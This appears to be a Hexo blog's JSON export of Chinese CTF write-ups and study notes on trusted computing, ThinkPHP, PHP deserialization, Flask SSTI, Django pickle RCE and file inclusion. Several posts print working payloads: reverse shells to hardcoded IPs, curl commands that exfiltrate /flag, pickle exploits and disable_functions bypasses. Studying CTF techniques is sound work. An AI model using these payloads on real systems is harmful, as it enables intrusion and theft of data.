{"meta":{"title":"RuoWeber","subtitle":"","description":"","author":"asy","url":"http://yoursite.com","root":"/"},"pages":[],"posts":[{"title":"可信计算苟名","slug":"可信计算苟命学习","date":"2020-04-06T16:00:00.000Z","updated":"2020-04-09T16:30:54.856Z","comments":true,"path":"2020/04/07/可信计算苟命学习/","link":"","permalink":"http://yoursite.com/2020/04/07/%E5%8F%AF%E4%BF%A1%E8%AE%A1%E7%AE%97%E8%8B%9F%E5%91%BD%E5%AD%A6%E4%B9%A0/","excerpt":"","text":"可信计算的概念 为什么会有可信计算的概念? pc机及其操作系统并不安全，极容易产生安全事故 为了从根本上解决计算机和网络结构上的不安全，必须从芯片、硬件结构和操作系统等方面综合采取措施-&gt;可信计算的基本思想。 可信计算的基本思想? 其目的是在计算和通信系统中广泛使用基于硬件安全模块支持下的可信的计算平台，以提高整体的安全性。 硬件结构和操作系统的安全是基础，密码、网络安全等技术是关键技术 什么是可信计算？ 可信计算是一种信息系统安全新技术，包括可信硬件、可信软件、可信网络和可信计算应用等诸多方面 可信计算的规范 TCG工作组？ TCG工作组1: TPM：可信平台模块工作组 TSS：可信计算组织软件栈工作组(专门用于使用TPM特性的制定的硬件和操作系统独立接口) TNC：可信网络连接工作组 IWG：基础设施工作组 TCG工作组2: PC客户机程序工作组 服务器工作组 移动电话工作组 TCG工作组3: 存储系统工作组：为可卸除式多媒体磁盘驱动器、闪存、以及包含存储控制接口的各种存储设备系统制定专用存储系统的安全服务标准 TCG实现的主要规范? TPM：提供了一套不可改变的加密和安全函数 TSS：为了高层的应用软件发布低层的TPM请求和接受低层的TPM响应 可信计算的基本思想与主要的技术路线 信任：信任是一种二元关系，可以一对一、一对多、多对一或多对多，其还具备以下特性 1.二重性 2.不一定有对称性 3.信任可度量，即信任的程度可以划分等级 4.信任可传递，但不绝对 4.信任还具有动态性的 信任根：信任根是系统可信的基点，TCG认为一个可信计算平台必须包含3个可信根： 1.可信测量根CRTM 2.可信存储根RTS 3.可信报告根RTR 创建可信链，第一个实体必须为可信根。且没有机制测RTM。 可信计算的基本思想：先建立一个信任根，再建立一条信任链，从信任根开始到硬件平台、到操作系统、再到应用、，一级认证一级，一级信任一级。从而把这种信任扩展到整个计算机系统 可信计算平台模块TPM 内容：是一种专用的安全芯片，包含了一个公私钥对，包含了一个用于说明公钥属于合法TPM的证书 它是一种SOC芯片，它是可信计算平台的信任根（可信存储根和可信报告根） 功能：完成可信度量的存储、可信度量的报告、密钥产生、加密和签名、数据安全存储等功能 其支撑软件(TSS)：是可信计算平台上TPM的支撑软件，TSS的作用主要是为操作系统和应用软件提供使用TPM的接口，结构分为： 1.TDDL模块，内核层 2.TCS模块，系统服务层 3.TSP处理模块，用户层 工作流程： 应用程序将数据和命令-&gt;API函数TSP-&gt;TCS-&gt;TDDL-&gt;TDD-&gt;TPM TPM的介绍(TPM的核心功能)TPM架构 其至少需要具备四个主要功能: 1.对称/非对称加密（非对称实现靠RSA算法，对称可以使用任意算法，既可以使用专用协处理器也可以使用软件） 2.安全存储 3.完整性度量（SHA-1散列算法） 4.签名认证（RSA算法）","categories":[],"tags":[{"name":"Else","slug":"Else","permalink":"http://yoursite.com/tags/Else/"}]},{"title":"tp5.1.x反序列化漏洞记录","slug":"tp5.1.x反序列化复现记录","date":"2020-03-29T16:00:00.000Z","updated":"2020-04-09T03:18:19.967Z","comments":true,"path":"2020/03/30/tp5.1.x反序列化复现记录/","link":"","permalink":"http://yoursite.com/2020/03/30/tp5.1.x%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%A4%8D%E7%8E%B0%E8%AE%B0%E5%BD%95/","excerpt":"","text":"Thinkphp5.1.x pop链复现pop链的开始反序列化漏洞__destruct开始，因为其可以在反序列化后自动执行，全局搜索: 看起removeFiles函数，发现调用了file_exists()，而file_exists()可以触发__toString()，这就是pop链的第一步，然后搜索含有 __toString()魔术方法的类,这里的conversion和collection类都可以，只不过collection麻烦一点，我们这里选择conversion类： 1234public function __toString()&#123; return $this-&gt;toJson();&#125; toJson内容: 1234public function toJson($options = JSON_UNESCAPED_UNICODE)&#123; return json_encode($this-&gt;toArray(), $options);&#125; toArray中关键步骤 为什么这里是重点呢？因为我们构建pop链反序列化的漏洞的目的就是执行我们想要的命令，怎么执行？ 1.可控对象调用可控函数并有可控的参数。 2.可控对象与任意函数(该对象没有的方法)配合__call()方法与可控参数来执行我们想执行的命令。 跟进getAttr()发现，其返回值为trait Attribute的data数组的$key键的值。记录下就是 1trait Attribute-&gt;data[&apos;$key&apos;] 这样$relation可控以后，我们就只要找可利用的visible方法，或者合适的__call方法(当然要让$name可控以及进入这个if条件还需一些细节，这里先不谈)。 这里我们直接分析pop链所用的request类: 可以看见调用了call_user_func_array(),并且对该函数来说，调用的函数可控，但是很难受的是参数数组加了一个request对象，$this作为直接能命令执行的函数的参数必报错。所以这里继续寻找一个requests类能直接利用的函数，首先看input(因为这个函数就是tp5.0前台rce的罪魁祸首)。 这里的getFilter通过查看源码发现，可以控制其正好能构造出filterValue命令执行时所需的system(很简单的不再赘述)。但是问题是这里的$data又不满足我们执行命令执行的参数的要求。所以看能不能再往上找一层，发现param调用了input(就不po图了)，但是发现param所需参数和在我们能力范围内控制的参数还差很多。再网上找发现isAjax调用了param，且参数可控，完美。 (其实还有好多要使程序按这个流程走下来的额外条件，但是那些很简单，很容易可以控制)。","categories":[],"tags":[{"name":"Else","slug":"Else","permalink":"http://yoursite.com/tags/Else/"}]},{"title":"ThinkPhp学习","slug":"ThinkPhp学习记录","date":"2020-02-19T16:00:00.000Z","updated":"2020-03-05T08:44:45.614Z","comments":true,"path":"2020/02/20/ThinkPhp学习记录/","link":"","permalink":"http://yoursite.com/2020/02/20/ThinkPhp%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/","excerpt":"ThinkPhp学习","text":"ThinkPhp学习 路由路由用于规划请求的访问地址，路由建立了请求地址到操作方法的映射关系。 thinkphp并非强制使用路由，也可以使用控制器/方法实现请求(如果定义了路由，那么就不能直接使用上述方法访问了，此外thinkphp还有个强制路由的选项)。 路由虽然会有一定的损失，但是它不仅提供了一种访问的规范，更有验证、权限、参数绑定及响应设置等功能。 控制器控制器接受请求，调用相应模型处理，最后利用视图输出，且控制器应该尽可能的不涉及业务逻辑。 模型模型主要做业务逻辑和数据封装，传给视图格式无关的数据 请求1.对于请求方法，tp支持请求方法伪造: 12345&lt;form method=&quot;post&quot; action=&quot;http://127.0.0.1/asyThink/public/index.php/hello/a&quot;&gt; &lt;input type=&quot;text&quot; name=&quot;name&quot; value=&quot;Hello&quot;&gt; &lt;input type=&quot;hidden&quot; name=&quot;_method&quot; value=&quot;GET&quot; &gt; &lt;input type=&quot;submit&quot; value=&quot;提交&quot;&gt;&lt;/form&gt; 只要提交_method属性的值，就可以改变请求方式(经过测试，这个不仅可以改变Request的method方法的值，还可以改变请求的路由)。 2.对于请求头信息的解析是有容错的 对于Request::header(‘user-Agent’)，HTTP请求头解析不区分大小写，并且-会转化为_, 数据库1.模型类可以定义connection(protected)属性(extends model)，这个可以使让该模型类操作数据库时按照给定的数据库配置连接。 中间件中间件按我的理解就是用来过滤请求中的数据的。 用php think make:middleware Check可以快捷地在app\\middleware目录下生成中间件Check， 主要用法是其handle方法 123456789101112131415&lt;?phpnamespace app\\middleware;use Closure;class Check&#123; public function handle($request, \\Closure $next, $name) &#123; if ($name == &apos;think&apos;) &#123; return redirect(&apos;index/think&apos;); &#125; return $next($request); &#125;&#125; 当然，上述中间件的功能是在返回请求前做一系列的业务处理，此为前置中间件，我们也可以使用 123$response = $next($request);执行代码return $response 此为后置中间件。 当然中间件还要注册且可以起别名 起别名在config\\middleware的alias下声明 注册中间件可以分为全局中间件，应用中间件，路由中间件，控制器中间件四种。 1.全局中间件的注册在app\\middleware.php中 且支持别名和给中间件传参,类似 12345return [ \\app\\middleware\\Auth::class, &apos;check&apos;, &apos;Hello&apos;,]; 2.应用中间件适用于多应用模式，直接在应用目录下添加middleware.php 3.路由中间件顾名思义,类似 12Route::rule(&apos;hello/:name&apos;,&apos;hello&apos;) -&gt;middleware(&apos;auth&apos;, &apos;admin&apos;);给auth中间件传admin参数 4.控制器中间件直接在控制器有$middleware属性（数组类型）","categories":[],"tags":[{"name":"Else","slug":"Else","permalink":"http://yoursite.com/tags/Else/"}]},{"title":"Hgame2020-Week4-部分WebWP","slug":"Hgame2020Week4Web(Php&Js)","date":"2020-02-13T16:00:00.000Z","updated":"2020-03-05T07:59:41.747Z","comments":true,"path":"2020/02/14/Hgame2020Week4Web(Php&Js)/","link":"","permalink":"http://yoursite.com/2020/02/14/Hgame2020Week4Web(Php&Js)/","excerpt":"前言寒假在家做了下今年的hgame,不管说是单从wee4或者综合来看好像比去年的简单不少。。。(但是依然觉得很难orz)。这里闲来无事先记录下week4Web的php和js的两道题","text":"前言寒假在家做了下今年的hgame,不管说是单从wee4或者综合来看好像比去年的简单不少。。。(但是依然觉得很难orz)。这里闲来无事先记录下week4Web的php和js的两道题 PHP(xxe盲注套娃hitcon的babyfirst-revenge)抓包一看，肯定第一想法是xxe打一梭子，发现回显有点奇怪看不懂。。。然后就想到了xxe数据外带，从网上找个exp来试下， ,z.dtd内容为： 读取/flag无果后，发现/etc/hosts有个内网主机，访问下发现需要带上队伍token访问(这里有一点，就是dtd中用php://filter读取时需要使用zlib.deflate压缩下，要不返回的数据太多会报错。。。),带上token后访问得到的数据解压后(php://filter/read=convert.base64-encode/zlib.inflate//resource=xxx)写成html看一下, 发现是hitcon的babyfirst-revenge的原题(没截图了。。) 然后写个脚本去getshell(网上都有，就不展示自己的💩代码了)， 然后发现一直没找到flag，最后再/etc下面找到。。不知道这里出题人要考什么。。。硬翻到的。 sekiro(js原型链污染)第一次做原型链污染的题。。。原型链污染的原理网上很多。按照我的理解就是原型链污染的危害就是可以利用一些赋值操作恶意地给某个对象赋予一个恶意的属性，这里漏洞其实很明显的，审计源码发现再/action路由下面 这里有了原型链污染的点，但是怎么利用这个点去getflag或者命令执行到目前还不明显，继续往下看，跟进dealwithattacks的实现， 这里发现有个函数执行语句直接拼接了变量，我们再看下attacks的数组，发现有的键值是没有additionalEffect属性的，这里就很明显了，我们通过原型链污染，给object赋值一个恶意的additionalEffect的值，sekiro.attackInfo没有这个属性的话就会遵循原型链到object，继承object的additionalEffect的值，从而实现可控的命令执行。 脚本如下: 1234567891011121314151617import requestsimport jsonbaseurl = 'http://sekiro.hgame.babelfish.ink/' header = &#123; 'content-type': 'application/json'&#125;data = &#123;'solution':'123','__proto__':&#123;\"additionalEffect\":\"process.mainModule.require('child_process').exec('curl http://ip:port/`cat /flag｜base64` 0&gt;&amp;1')\"&#125;&#125;se = requests.Session()#get /re = se.get(baseurl)#get /infore = se.get(baseurl+'info')#get /attackre = se.get(baseurl+'attack')#post /actionre = se.post(baseurl+'action',headers=header,data=json.dumps(data)).textprint(re)","categories":[],"tags":[{"name":"Else","slug":"Else","permalink":"http://yoursite.com/tags/Else/"}]},{"title":"Bytectf-BabyblogWP","slug":"Bytectf-BabyblogWP","date":"2020-01-28T16:00:00.000Z","updated":"2020-01-29T13:22:27.514Z","comments":true,"path":"2020/01/29/Bytectf-BabyblogWP/","link":"","permalink":"http://yoursite.com/2020/01/29/Bytectf-BabyblogWP/","excerpt":"BabyblogWP二次注入第一个点为二次注入，题目可以拿到源码，然后在edit.php发现注入点 这里发现where title处直接拼接了row[‘title’](这个是从数据库取出的数据)，造成了二次注入。","text":"BabyblogWP二次注入第一个点为二次注入，题目可以拿到源码，然后在edit.php发现注入点 这里发现where title处直接拼接了row[‘title’](这个是从数据库取出的数据)，造成了二次注入。 由于有safefilter的过滤，所以这里采用十六进制堆叠注入使当前用户变成vip: &quot;update users set isvip=1 where username=&#39;xxx&#39;;&quot;.encode(&#39;hex&#39;) &#39;;set @t=0x************;prepare x from @t;execute x;&#39; 正则匹配/e参数的任意命令执行 看到preg_replace的pattern参数可控，在php版本较低时可以任意命令执行，payload为: find=/e%00(截断后面那个/)&amp;replace=phpinfo();,从而写进一个shell进行进一步利用 绕过openbasedir其实这个点我没怎么做，看到openbasedir和disable_function，第一反应是想办法执行根目录下的/readflag，这里学到一个绕过openbasedir的另一个操作： glob://协议和其他函数的结合使用 exp如下： 12345678&lt;?php if($b = opendir('glob:///*'))&#123; while(($file=readdir($b))!==false)&#123; echo $file.\" \"; &#125; closedir($b); &#125;?&gt; 绕过disable_funtion这里选择了使用LD_PRELOAD劫持函数实现任意命令执行，这里直接执行了/readflag&gt;/var/www/html/a.txt 但是发现这是个有SIGALRM信号的计算题，本来这个题很好算，只要trap &quot;&quot; 14忽略信号处理慢慢算即可，但这的前提是你有个比较完整的shell，但是buu这里又反弹不了shell，我们手里的shell又无法直接绕过disable_function执行系统命令，所以这里参考*ctf的管道解法，偷到一个perl脚本(稍微改下) 1234567891011121314151617181920use strict;use IPC::Open3;my $pid = open3( \\*CHLD_IN, \\*CHLD_OUT, \\*CHLD_ERR, '/readflag' ) or die \"open3() failed $!\";my $r;$r = &lt;CHLD_OUT&gt;;print \"$r\";$r = &lt;CHLD_OUT&gt;;print \"$r\";$r = eval \"$r\";print \"$r\\n\";print CHLD_IN \"$r\\n\";$r = &lt;CHLD_OUT&gt;;print \"$r\";$r = &lt;CHLD_OUT&gt;;print \"$r\";$r = &lt;CHLD_OUT&gt;;print \"$r\"; 这里利用LD_PRELOAD劫持函数直接运行这个perl脚本(一般linux服务器都有perl)， 执行putenv，利用error_log(‘’,1,’’,’’)起新进程来执行我们的命令: 得到flag:","categories":[],"tags":[{"name":"技术辣鸡的PHP","slug":"技术辣鸡的PHP","permalink":"http://yoursite.com/tags/%E6%8A%80%E6%9C%AF%E8%BE%A3%E9%B8%A1%E7%9A%84PHP/"}]},{"title":"2018_web_virink_web","slug":"2018_web_virink_web","date":"2019-12-01T16:00:00.000Z","updated":"2020-03-05T08:04:18.228Z","comments":true,"path":"2019/12/02/2018_web_virink_web/","link":"","permalink":"http://yoursite.com/2019/12/02/2018_web_virink_web/","excerpt":"命令执行写shell","text":"命令执行写shell 1. 命令执行受限长度，其实这里是参考的hitcon的一道题，只不过那个要求更严格(5)，这里可以使用linux sh的特性 先把要执行的命令写入文件名:&gt;eval,然后ls&gt;a.php,但是这里有一点是sh默认是字典序排序的，所以利用ls -t强制使用时间序写入，这样便可以写成shell。 ip和port扫描1.这里拿到shell后没找到flag，所以说应该是在内网里,(由于buu无法访问外网，所以无法反弹shell，这样很麻烦感觉) 2.获取服务器的内网ip 其实一开始看/etc/hosts，有个173开头的(我以为内网ip都是那些10，172，192开头的，计网太菜orz)没注意，最后在各方dalao的帮助下，成功获取到内网上flag机器的ip，这里也从大师傅那里学习到一个新的文件:路由树:/proc/net/fib_trie。 3.端口扫描 这里提示的python3没在环境变量里，使用/usr/bin/python3可以执行python文件，那么这里就可以用python3去写脚本扫描端口(使用socket库) 得到80，9000，873端口 php-fpm漏洞和rsync未授权访问漏洞1.从p师傅那儿偷的脚本执行命令,/usr/bin/python3 exp.py ip /www/redirect.php -c &#39;&lt;?php echo pwd(反引号)?&gt;&#39;这里这个php文件是根据获取原服务器的文件位置猜测出的。 2.rsync未授权访问漏洞 Rsync是Linux下一款数据备份工具，支持通过rsync协议、ssh协议进行远程文件传输。常被用于在内网进行源代码的分发及同步更新，因此使用人群多为开发人员。其中rsync协议默认监听873端口，而一般开发人员安全意识薄弱的情况下，如果目标开启了rsync服务，并且没有配置ACL或访问密码，我们将可以读写目标服务器文件。 查看rsync的配置文件/etc/rsyncd.conf，看到src节点path设置到了/可以将/下的flag备份到有读权限的位置(比如/tmp), rsync -avz ip::src/flag /tmp/ 感受这个题原来听队内dalao说以前没动态靶机的时候flag直接在/下(估计是大师傅‘方便’我们做题吧),后来换成动态靶机再做，就感觉还是学到很多，getshell这一步学到了，然后拿到一个不太强的shell后，而且用户权限受限太多，(curl什么的都没有.)，功能比较贫瘠的情况下，学习利用php的file_get_contents探测内网，然后利用python，socket去扫端口。以及后来的php-fpm执行命令漏洞。 额外的，这题本来想尝试用reGeorg+proxychains去代理，然后nmap+msf打，后来环境受限(访问频率)就放弃了，其实可以拿到内网ip后可以尝试去按照这条路打一下的。","categories":[],"tags":[{"name":"技术辣鸡的PHP","slug":"技术辣鸡的PHP","permalink":"http://yoursite.com/tags/%E6%8A%80%E6%9C%AF%E8%BE%A3%E9%B8%A1%E7%9A%84PHP/"}]},{"title":"无参数rce举例学习","slug":"无参数rce举例学习","date":"2019-09-09T10:30:35.000Z","updated":"2019-11-11T03:44:18.964Z","comments":true,"path":"2019/09/09/无参数rce举例学习/","link":"","permalink":"http://yoursite.com/2019/09/09/%E6%97%A0%E5%8F%82%E6%95%B0rce%E4%B8%BE%E4%BE%8B%E5%AD%A6%E4%B9%A0/","excerpt":"文章原由本文是因为ByteCTF中的一道题而学习到的，学的比较浅，简单记录下。 什么是无参数rce(读取文件)这个来源于一段正则: 123if(&apos;;&apos;===preg_replace(&apos;[a-z]+\\((?R)?\\)&apos;,&apos;NULL&apos;,$_GET[&apos;code&apos;]))&#123; eval($_GET[&apos;code&apos;]);&#125;","text":"文章原由本文是因为ByteCTF中的一道题而学习到的，学的比较浅，简单记录下。 什么是无参数rce(读取文件)这个来源于一段正则: 123if(&apos;;&apos;===preg_replace(&apos;[a-z]+\\((?R)?\\)&apos;,&apos;NULL&apos;,$_GET[&apos;code&apos;]))&#123; eval($_GET[&apos;code&apos;]);&#125; 正则解析这个正则的里面看不懂的就是(?R)这个吧，这个是pcre正则后来又添加的一个特殊标志，表示去递归正则匹配表达式(这个就可以用来做那种检查括号匹配的正则)，\\((?R)?\\),这样看来，这段php代码只能传参类似a(b(c()))这种样式代码，就相当于利用无参数函数去getshell(文件读取)，下面举例的这些姿势来自飘零大佬的博客,(orz). 1.getenv()getenv()获取当前的环境变量，并返回一个数组，那么怎么利用这个呢？注意到函数array_rand()，这个函数被传入一个数组，然后返回一个随机的数组元素的下标，但是鸡肋的地方在于这些环境变量的数组，下标一般没啥用，主要在其值上起作用，但是另一个函数array_flip()，就显得很给力，该函数可以把数组的下标和键值互换，生成一个新的数组并返回，于是便可利用array_rand(array_flip(getenv()));来爆破。 2.getallheaders()在apache下，我们可以利用这个获取到http的headers，这样我们只要在请求包的headers造一个恶意的数据，然后去在eval的地方用getallheaders获取到即可rce，比如说下面这个var_dump(end(getallheaders()));，这里说一下end(),next()，和current(),他们都是通过数组的指针来获取数组的元素，只不过获取的具体位置不同。 3.get_definded_vars()getallheaders()只在apache上有用，局限性也比较大，get_definded_vars()回显全局变量，在服务器上，可能回显到($_GET,$_POST,$_FILES,$_COOKIE)，所以这个利用也就很多方式了，get，post，cookie可能会受到限制，这里从飘零大佬学一个file的利用脚本 12345678910import requestsfrom io import BytesIOpayload=&quot;system(&apos;ls /tmp&apos;);&quot;.encode(&apos;hex&apos;)files=&#123; payload: ByteIO(&apos;xxx&apos;)&#125;r = requests.post(&apos;url&apos;/?code=&apos;eval(hex2bin(array_rand(end(get_definded_vars()))));&apos;,files=files)print r.content 这里的hex编码是为了防止空格或者一些特殊字符被转义或替代。 4.session_id()由于PHPSESSID可以有数字和字母，这个便也可以利用。飘零大佬的脚本(orz)。 12345678import requestsurl = &apos;http://localhost/?code=eval(hex2bin(session_id(session_start())));&apos;payload = &quot;echo &apos;sky cool&apos;;&quot;.encode(&apos;hex&apos;)cookies = &#123; &apos;PHPSESSID&apos;:payload&#125;r = requests.get(url=url,cookies=cookies)print r.content 5.dirname()与chdir()我们可以看出，上面这些都是基本没有过滤时可以实现，但是稍微一加限制，我们可能就无法getshell，但是如果能读取文件也不错，我们可以readfile(),dirname,chdir()来结合getcwd(),scandir()等来实现 感受无参数rce(文件读取)姿势肯定还有很多，主要看对php函数的利用。 ByteCTF BoringCode123456789101112131415161718192021222324252627282930313233&lt;?phpfunction is_valid_url($url) &#123; if (filter_var($url, FILTER_VALIDATE_URL)) &#123; if (preg_match(&apos;/data:\\/\\//i&apos;, $url)) &#123; return false; &#125; return true; &#125; return false;&#125;if (isset($_POST[&apos;url&apos;]))&#123; $url = $_POST[&apos;url&apos;]; if (is_valid_url($url)) &#123; $r = parse_url($url); if (preg_match(&apos;/baidu\\.com$/&apos;, $r[&apos;host&apos;])) &#123; $code = file_get_contents($url); if (&apos;;&apos; === preg_replace(&apos;/[a-z]+\\((?R)?\\)/&apos;, NULL, $code)) &#123; if (preg_match(&apos;/et|na|nt|strlen|info|path|rand|dec|bin|hex|oct|pi|exp|log/i&apos;, $code)) &#123; echo &apos;bye~&apos;; &#125; else &#123; eval($code); &#125; &#125; &#125; else &#123; echo &quot;error: host not allowed&quot;; &#125; &#125; else &#123; echo &quot;error: invalid url&quot;; &#125;&#125;else&#123; highlight_file(__FILE__);&#125; 这题前面域名那的本来想的绕过，但是利用0://url;baidu.com等畸形url绕过前面的以后，file_get_contents还是无法利用,看完wp，才明白这是ByteDance这是来调戏Baidu的，直接注册一个结尾为baidu.com域名来绕过正则即可，解析到自己的服务器上，直接无参数读取文件就完事了（当然绕过过滤）, 这里参考到这篇博客,利用localeconv()返回数组的第一个产生‘.’，(current使用pos代替),便可scandir到’.’和‘..’(next)，如果我们仅仅读取当前目录的上一级目录，感觉完全可以不去chdir跳目录，直接读取就vans了，但是目录如果层数相差很多肯定要去用chdir切换当前目录，但是这里chdir返回的时bool值，dirname(chdir(‘..’))，不可行，因为dirname被过滤了，这里看到博客作者的一种方法,利用time函数去接受bool值，然后localtime函数接收time函数返回值，并且它会返回数组，取出秒数，当值为46时，chr(46)会转换位’.’，这样便可以实现chdir后，用一个(几个)函数接收bool值并且返回’.’ 参考: altman Skysec-PHP Parametric Function RCE","categories":[],"tags":[{"name":"技术辣鸡的PHP","slug":"技术辣鸡的PHP","permalink":"http://yoursite.com/tags/%E6%8A%80%E6%9C%AF%E8%BE%A3%E9%B8%A1%E7%9A%84PHP/"}]},{"title":"FlaskJinja2SSTI","slug":"FlaskJinja2SSTI","date":"2019-09-08T09:39:47.000Z","updated":"2019-11-11T03:45:11.117Z","comments":true,"path":"2019/09/08/FlaskJinja2SSTI/","link":"","permalink":"http://yoursite.com/2019/09/08/FlaskJinja2SSTI/","excerpt":"前言500线下因为这题没了。。。","text":"前言500线下因为这题没了。。。 漏洞文件读取这里有一点是，如果我的url里包含，那么xxx会被模板引擎执行 ，利用这一点， 使用&#39;&#39;.__class__.__mro__[2]先获取到object类的属性(python里所有类都继承于它，这样我们便可以找到我们想要的类了(&#39;&#39;.__class__.__mro__[2].__subclasses__() ))。然后我们找到一个利用点较直接的类:File,此时我们有了第一个任意文件读取和写入的exp: 12345678910- &apos;&apos;.__class__.__mro__[2].__subclasses__()[40](&apos;/etc/passwd&apos;).read()- &apos;&apos;.__class__.__mro__[2].__subclasses__()[40](&apos;/tmp/owned.cfg&apos;, &apos;w&apos;).write(&apos;&lt;malicious code here&gt;&apos;)接下来就是利用Flask(Jinja2)的特性进行rce了(8太懂，直接po出exp)1.&apos;&apos;.__class__.__mro__[2].__subclasses__()[40](&apos;/tmp/owned.cfg&apos;, &apos;w&apos;).write(&apos;from subprocess import check_output\\n\\nRUNCMD = check_output\\n&apos;)2.config.from_pyfile(&apos;/tmp/owned.cfg&apos;)3.config[&apos;RUNCMD&apos;](&apos;/usr/bin/id&apos;,shell=True) 这里[40]是file类，这是任意文件读取可以用的，但是如果read被ban可能就难受了。 命令执行1.命令执行的第一种是利用eval，怎样去“到达”eval:利用warnings.catch_warnings类的globals属性去找built-in function payload: 1234&apos;&apos;.__class__.__mro__[2].__subclasses__[59].__init__.__globals__[&apos;__builtins__&apos;][&apos;eval&apos;](&apos;__import__(&apos;os&apos;).system(&apos;cmd&apos;)&apos;)&apos;&apos;.__class__.__mro__[2].__subclasses__()[59].__init__.__globals__[&apos;__builtins__&apos;][&apos;__import__&apos;](&apos;os&apos;).popen(&apos;cmd&apos;).read()().__class__.__bases__[0].__subclasses__()[59].__init__.func_globals[&apos;linecache&apos;].__dict__[&apos;o&apos;+&apos;s&apos;].__dict__[&apos;sy&apos;+&apos;stem&apos;](&apos;ls&apos;)[].__class__.__base__.__subclasses__()[76].__init__.__globals__[&apos;os&apos;].system(&apos;bash -c &quot;bash -i &gt;&amp; /dev/tcp/139.159.140.198/2345 0&gt;&amp;1&quot;&apos;)(这个类是site.Quitter，还没分析) 这里其实popen也有read，而且命令无回显也会很难受。 shell和带外?如果命令无回显，我们肯定可以做的就是反弹shell,但是如果我们能拿到shell，所有问题都可以解决: 弹shell再这我们讨论的情况肯定就是bash或者python，bash好说，只要我们bash弹shell的exp用命令执行的payload执行就可以了(发现是bash弹shell的命令的问题。。改好可以成功执行了) 121.&apos;&apos;.__class__.__mro__[2].__subclasses__()[59].__init__.__globals__[&apos;__builtins__&apos;][&apos;eval&apos;](&apos;__import__(&quot;os&quot;).popen(&quot;bash -c \\&apos;bash -i &amp;&gt;/dev/tcp/192.168.76.195/7777 0&gt;&amp;1\\&apos;&quot;).read()&apos;)2.&apos;&apos;.__class__.__mro__[2].__subclasses__()[59].__init__.__globals__[&apos;__builtins__&apos;][&apos;eval&apos;](&apos;__import__(&quot;os&quot;).system(&quot;bash -c \\&apos;bash -i &amp;&gt;/dev/tcp/192.168.76.195/7777 0&gt;&amp;1\\&apos;&quot;)&apos;) 或者可以进行带外把数据带出来: &#39;&#39;.__class__.__mro__[2].__subclasses__()[59].__init__.__globals__[&#39;__builtins__&#39;][&#39;eval&#39;](&#39;__import__(&quot;os&quot;).system(&quot;curl http://192.168.76.195:7777？a=cat /flag.txt``”)’)` 另外反弹bash shell在python ssti中虽然可以借助命令执行很方便， 但是可以尝试先写入文件，在执行文件去反弹 python shell: &#39;&#39;.__class__.__mro__[2].__subclasses__()[59].__init__.__globals__[&#39;__builtins__&#39;][&#39;execfile&#39;](&#39;/home/alss/Desktop/testsys.py&#39;) 或者其他执行文件的方法","categories":[],"tags":[{"name":"难度简单的Python","slug":"难度简单的Python","permalink":"http://yoursite.com/tags/%E9%9A%BE%E5%BA%A6%E7%AE%80%E5%8D%95%E7%9A%84Python/"}]},{"title":"Django低版本Rce","slug":"Django低版本Rce","date":"2019-09-08T09:25:09.000Z","updated":"2019-09-08T09:34:00.000Z","comments":true,"path":"2019/09/08/Django低版本Rce/","link":"","permalink":"http://yoursite.com/2019/09/08/Django%E4%BD%8E%E7%89%88%E6%9C%ACRce/","excerpt":"漏洞原因及版本漏洞产生是因为django&lt;1.5(?)时，采用的(反)序列化的方法是c中的pickle，因而可能产生rce，","text":"漏洞原因及版本漏洞产生是因为django&lt;1.5(?)时，采用的(反)序列化的方法是c中的pickle，因而可能产生rce， 举例展示pickle序列化时的漏洞如serialize.py 123456789101112131415161718192021222324252627282930313233343536373839import base64try:​ import cPickle as pickleexcept:​ import pickleclass id(object):​ def __reduce__(self):​ import subprocess​ return (subprocess.call,​ ([&apos;python&apos;,​ &apos;-c&apos;,​ &apos;import socket,subprocess,os;&apos;​ &apos;s=socket.socket(socket.AF_INET,socket.SOCK_DGRAM);&apos;​ &apos;s.connect((&quot;62.234.128.237&quot;,7777));&apos;​ &apos;os.dup2(s.fileno(),0);&apos;​ &apos;os.dup2(s.fileno(),1);&apos;​ &apos;os.dup2(s.fileno(),2);&apos;​ &apos;subprocess.call([&quot;/bin/sh&quot;,&quot;-i&quot;]);&apos;],))sess=base64.b64encode(pickle.dumps(id()))print sess unserialize.py 12345678910111213import sysimport base64try:​ import cPickle as pickleexcept:​ import picklepickle.loads(base64.b64decode(sys.argv[1])) serialize.py的结果用unserialize.py去反序列化时会执行__reduce__方法的内容（这里时反弹udp的shell） django中使用django中使用只需要知道两点 1.secret_key 2.能够控制session等使用secret_key序列化加密的东西（比如session存储在客户端cookie时） 由于django没有深入学习过，先po到这里一个exp 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647# coding: utf-8from django.contrib.sessions.serializers import PickleSerializerfrom django.core import signingfrom django.conf import settingssettings.configure(SECRET_KEY=&apos;oa4$kkk802=rfm@tl^e5yb3qvs_ea3r!m*&amp;j+#_+s-9=xcieci&apos;)class GetShellWithPython(object):​ def __reduce__(self):​ import subprocess​ return (subprocess.call,​ ([&apos;python&apos;,​ &apos;-c&apos;,​ &apos;import socket,subprocess,os;&apos;​ &apos;s=socket.socket(socket.AF_INET,socket.SOCK_DGRAM);&apos;​ &apos;s.connect((&quot;95.179.179.3&quot;,7777));&apos;​ &apos;os.dup2(s.fileno(),0);&apos;​ &apos;os.dup2(s.fileno(),1);&apos;​ &apos;os.dup2(s.fileno(),2);&apos;​ &apos;subprocess.call([&quot;/bin/sh&quot;,&quot;-i&quot;]);&apos;],))sess = signing.dumps(​ obj=GetShellWithPython(),​ serializer=PickleSerializer,​ salt=&apos;django.contrib.sessions.backends.signed_cookies&apos;)print(sess)","categories":[],"tags":[{"name":"难度简单的Python","slug":"难度简单的Python","permalink":"http://yoursite.com/tags/%E9%9A%BE%E5%BA%A6%E7%AE%80%E5%8D%95%E7%9A%84Python/"}]},{"title":"文件包含漏洞的利用","slug":"文件包含漏洞的利用","date":"2019-09-08T09:10:33.000Z","updated":"2020-03-05T09:26:38.580Z","comments":true,"path":"2019/09/08/文件包含漏洞的利用/","link":"","permalink":"http://yoursite.com/2019/09/08/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E%E7%9A%84%E5%88%A9%E7%94%A8/","excerpt":"文件包含","text":"文件包含 文件包含伪协议。。。 文件包含自写入的文件利用session。。。 利用日志文件(错误访问)。。。 文件自包含加post这里利用PHP的post文件特性，当文件自包含爆栈后，临时文件被保存下来 